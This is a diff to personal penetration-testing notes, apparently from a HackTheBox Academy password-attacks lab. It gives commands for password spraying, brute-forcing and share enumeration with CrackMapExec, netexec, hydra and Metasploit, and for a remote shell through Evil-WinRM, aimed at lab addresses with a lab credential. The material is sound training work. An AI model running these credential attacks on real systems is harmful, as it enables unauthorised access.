@@ -2,21 +2,21 @@
 
 https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
 
-[[Pentest/Enumeration/services/SMB]] [[LDAP]] [[mssql]]
+[[Pentest/services/SMB/SMB]] [[LDAP]] [[mssql]]
 ##### SMB, LDAP, MSSQL, etc.
 https://github.com/byt3bl33d3r/CrackMapExec
-
+#CrackMapExec 
 ```shell
 sudo apt-get -y install crackmapexec
 
+# Dictionary-attack / Password-Spraying
 crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```
 
 ```shell
 crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
 ```
-
-#### [[Pentest/Enumeration/services/SMB|SMB]] enumeration
+#### [[Pentest/services/SMB/SMB|SMB]] enumeration
 list shares
 ```bash
 netexec smb 10.129.128.107  -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZpsmbmap -H 10.129.128.107 --shares
@@ -31,7 +31,7 @@ ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 1
 #### Evil-WinRM
 #shell [[bind shell]]
 to log in and get the shell:
-```
+```bash
 sudo gem install evil-winrm
 evil-winrm -i 10.129.42.197 -u user -p password
 ```
@@ -49,12 +49,19 @@ hydra -L user.list -P password.list ssh://10.129.42.197
  hydra -L user.list -P password.list smb://10.129.42.197
 ```
 
-##### SMB via metasploit
+```bash
+hydra -L user.list -P password.list 10.129.42.197 smb
+```
+### Dictionary attack on SMB use msfconsole
 ```shell
 msfconsole -q
 use auxiliary/scanner/smb/smb_login
 set PASS_FILE password.list
+
+set SMB_USER jason
 set USER_FILE username.list
+
+set stop_on_success true
 set RHOST STMIP
 run
 ```
